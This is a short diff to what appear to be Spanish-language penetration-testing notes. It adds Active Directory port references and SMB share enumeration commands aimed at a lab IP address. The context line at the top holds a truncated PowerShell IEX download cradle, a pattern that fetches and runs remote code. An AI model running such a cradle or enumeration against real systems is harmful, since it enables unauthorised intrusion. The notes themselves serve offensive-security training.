@@ -1828,4 +1828,25 @@ Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http
 
 # Active Directory
 
-## 
+## Puertos Comunnes y Servicios
+
+```bash
+88/tcp Kerberos
+5985/tcp WinRM
+
+
+```
+
+## Listar SMB shares
+
+```
+
+smbmap -H 10.129.2.148 -u 'masa'
+
+smbclient -L 10.129.2.148 -N
+
+```
+
+
+
+
